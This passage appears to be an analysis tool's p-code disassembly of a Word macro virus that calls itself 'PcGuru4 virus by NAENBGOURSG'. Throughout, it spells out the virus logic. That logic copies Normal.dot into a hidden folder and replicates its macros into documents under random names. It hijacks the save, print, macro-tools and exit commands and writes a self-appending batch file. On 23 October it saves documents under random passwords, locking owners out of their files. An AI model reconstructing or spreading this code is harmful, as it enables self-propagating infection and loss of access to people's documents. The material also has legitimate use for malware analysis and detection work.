' 	LitStr 0x0008 "\PcGuru2"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MkDir 0x0001 
' Line #18:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	ParamNamed FileName 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0008 "\PcGuru2"
' 	Add 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #19:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0008 "\PcGuru2"
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsCall SetAttr 0x0002 
' Line #20:
' Line #21:
' Line #22:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0005 "NOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitStr 0x0002 "FC"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 1"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0008 "FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 2"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x000A "FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 3"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0009 "FilePrint"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 4"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0010 "FilePrintDefault"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 5"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x000D "FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #29:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 5"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x000A "ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 6"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0008 "FileExit"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 7"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	LitStr 0x0007 "PCGURU4"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' Line #33:
' Line #34:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000C "\PcGuru4.bat"
' 	Add 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Rem PcGuru4 virus by NAENBGOURSG"
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Rem Golden Version 4.3"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "type PcGuru4.bat >> PcGuru4.bat"
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #40:
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	QuoteRem 0x0000 0x000E "by NAENBGOURSG"
' Line #43:
' Line #44:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall SetAttr 0x0002 
' Line #45:
' Line #46:
' 	Label xxut 
' Line #47:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #48:
' 	EndSub 
' Macros/VBA/xIFiXuSkkU - 4172 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn False
' Line #3:
' 	Dim 
' 	VarDefn h
' Line #4:
' 	Dim 
' 	VarDefn g
' Line #5:
' 	Dim 
' 	VarDefn T
' Line #6:
' 	QuoteRem 0x0000 0x000E "by NAENBGOURSG"
' Line #7:
' Line #8:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Z 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #10:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' Line #12:
' 	LitStr 0x0003 "M 4"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld h 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #14:
' 	LitStr 0x0001 "M"
' 	Ld h 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #15:
' 	StartForVariable 
' 	Ld h 
' 	EndForVariable 
' 	NextVar 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	StartForVariable 
' 	Ld g 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #19:
' 	LitStr 0x0001 "M"
' 	Ld g 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld pn$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentVar 0x0002 
' Line #20:
' 	StartForVariable 
' 	Ld g 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' Line #22:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 1"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #23:
' 	LitStr 0x0008 "FileSave"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #24:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 2"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #25:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #26:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 3"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #27:
' 	LitStr 0x0009 "FilePrint"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #28:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 4"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #29:
' 	LitStr 0x0010 "FilePrintDefault"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #30:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 5"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #31:
' 	LitStr 0x000D "FileTemplates"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #32:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 6"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #33:
' 	LitStr 0x0008 "FileExit"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #34:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 7"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #35:
' 	LitStr 0x0007 "PCGURU4"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #36:
' Line #37:
' 	Ld False$ 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	St T$ 
' Line #38:
' 	LitStr 0x0002 "FC"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #39:
' 	Ld False$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St T$ 
' Line #40:
' 	LitStr 0x0005 "NOpen"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #41:
' Line #42:
' Line #43:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #44:
' 	GoTo Q 
' Line #45:
' Line #46:
' 	Label Z 
' Line #47:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #48:
' Line #49:
' 	Label Q 
' Line #50:
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' 	FuncDefn (Private Function pn())
' Line #56:
' 	Dim 
' 	VarDefn count_
' Line #57:
' 	Dim 
' 	VarDefn ab
' Line #58:
' 	Dim 
' 	VarDefn cd
' Line #59:
' 	Dim 
' 	VarDefn ss
' Line #60:
' 	Dim 
' 	VarDefn sP
' Line #61:
' Line #62:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000B 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0005 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	For 
' Line #63:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St ab 
' Line #64:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St cd 
' Line #65:
' Line #66:
' 	ArgsLd Rnd 0x0000 
' 	St ss 
' Line #67:
' 	Ld ss 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #68:
' 	Ld sP$ 
' 	Ld ab 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sP$ 
' Line #69:
' 	ElseBlock 
' Line #70:
' 	Ld sP$ 
' 	Ld cd 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sP$ 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' 	Ld sP$ 
' 	St pn$ 
' Line #74:
' Line #75:
' 	EndFunc 
' Macros/VBA/FRHfJrPf - 6170 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn False
' Line #3:
' 	Dim 
' 	VarDefn h
' Line #4:
' 	Dim 
' 	VarDefn g
' Line #5:
' 	Dim 
' 	VarDefn T
' Line #6:
' 	Dim 
' 	VarDefn pswr
' Line #7:
' 	QuoteRem 0x0000 0x000E "by NAENBGOURSG"
' Line #8:
' Line #9:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #10:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Z 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #12:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #13:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #14:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	LitStr 0x0003 "M 4"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld h 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #20:
' 	LitStr 0x0001 "M"
' 	Ld h 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #21:
' 	StartForVariable 
' 	Ld h 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	EndIfBlock 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld g 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #25:
' 	LitStr 0x0001 "M"
' 	Ld g 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld pn$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentVar 0x0002 
' Line #26:
' 	StartForVariable 
' 	Ld g 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' Line #28:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 1"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #29:
' 	LitStr 0x0008 "FileSave"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #30:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 2"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #31:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #32:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 3"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #33:
' 	LitStr 0x0009 "FilePrint"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #34:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 4"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #35:
' 	LitStr 0x0010 "FilePrintDefault"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #36:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 5"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #37:
' 	LitStr 0x000D "FileTemplates"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #38:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 6"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #39:
' 	LitStr 0x0008 "FileExit"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #40:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	LitStr 0x0003 "M 7"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Add 
' 	St T$ 
' Line #41:
' 	LitStr 0x0007 "PCGURU4"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #42:
' Line #43:
' 	Ld False$ 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	St T$ 
' Line #44:
' 	LitStr 0x0002 "FC"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #45:
' 	Ld False$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St T$ 
' Line #46:
' 	LitStr 0x0005 "NOpen"
' 	Ld T$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #47:
' Line #48:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Hour 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Minute 0x0001 
' 	LitDI2 0x001E 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #49:
' 	Ld pas$ 
' 	St pswr$ 
' Line #50:
' 	Ld pswr$ 
' 	Ld dlg 
' 	MemSt Password 
' Line #51:
' 	LitStr 0x0006 "PCGURU"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Minute 0x0001 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Second 0x0001 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld pswr$ 
' 	LitStr 0x000B "NAENBGOURSG"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #52:
' 	EndIfBlock 
' Line #53:
' Line #54:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #55:
' 	GoTo Q 
' Line #56:
' Line #57:
' 	Label Z 
' Line #58:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #59:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Label Q 
' Line #62:
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' 	FuncDefn (Private Function pas())
' Line #68:
' 	Dim 
' 	VarDefn count_
' Line #69:
' 	Dim 
' 	VarDefn ab
' Line #70:
' 	Dim 
' 	VarDefn cd
' Line #71:
' 	Dim 
' 	VarDefn ef
' Line #72:
' 	Dim 
' 	VarDefn xx
' Line #73:
' 	Dim 
' 	VarDefn xP
' Line #74:
' Line #75:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000B 
' 	LitDI2 0x0009 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0009 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	For 
' Line #76:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St ab 
' Line #77:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St cd 
' Line #78:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0039 
' 	LitDI2 0x0030 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0030 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St ef 
' Line #79:
' Line #80:
' 	ArgsLd Rnd 0x0000 
' 	St xx 
' Line #81:
' 	Ld xx 
' 	LitR8 0x6666 0x6666 0x6666 0x3FD6 
' 	Lt 
' 	IfBlock 
' Line #82:
' 	Ld xP$ 
' 	Ld ab 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St xP$ 
' Line #83:
' 	Ld xx 
' 	LitR8 0xF5C3 0x5C28 0xC28F 0x3FD5 
' 	Gt 
' 	Paren 
' 	Ld xx 
' 	LitR8 0xF5C3 0x5C28 0xC28F 0x3FE5 
' 	Lt 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #84:
' 	Ld xP$ 
' 	Ld cd 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St xP$ 
' Line #85:
' 	ElseBlock 
' Line #86:
' 	Ld xP$ 
' 	Ld ef 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St xP$ 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	Ld xP$ 
' 	St pas$ 
' Line #90:
' Line #91:
' 	EndFunc 
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' 	FuncDefn (Private Function pn())
' Line #96:
' 	Dim 
' 	VarDefn count_
' Line #97:
' 	Dim 
' 	VarDefn ab
' Line #98:
' 	Dim 
' 	VarDefn cd
' Line #99:
' 	Dim 
' 	VarDefn ss
' Line #100:
' 	Dim 
' 	VarDefn sP
' Line #101:
' Line #102:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000B 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0005 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	For 
' Line #103:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St ab 
' Line #104:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St cd 
' Line #105:
' Line #106:
' 	ArgsLd Rnd 0x0000 
' 	St ss 
' Line #107:
' 	Ld ss 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #108:
' 	Ld sP$ 
' 	Ld ab 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sP$ 
' Line #109:
' 	ElseBlock 
' Line #110:
' 	Ld sP$ 
' 	Ld cd 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sP$ 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	NextVar 
' Line #113:
' 	Ld sP$ 
' 	St pn$ 
' Line #114:
' Line #115:
' 	EndFunc 
' Macros/VBA/BLbNs - 2139 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn i
' Line #3:
' 	QuoteRem 0x0000 0x000E "by NAENBGOURSG"
' Line #4:
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemCall EndOfDocument 0x0000 
' Line #8:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x000F 
' 	LitDI2 0x0018 
' 	For 
' Line #9:
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemCall FontSize 0x0001 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemCall Bold 0x0000 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #12:
' 	LitStr 0x000B "NAENBGOURSG"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #15:
' 	LitStr 0x0011 "Hello from GREECE"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #17:
' 	LitStr 0x0006 "PCGURU"
' 	LitStr 0x0005 "Print"
' 	LitStr 0x0001 "1"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #18:
' 	EndIfBlock 
' Line #19:
' Line #20:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
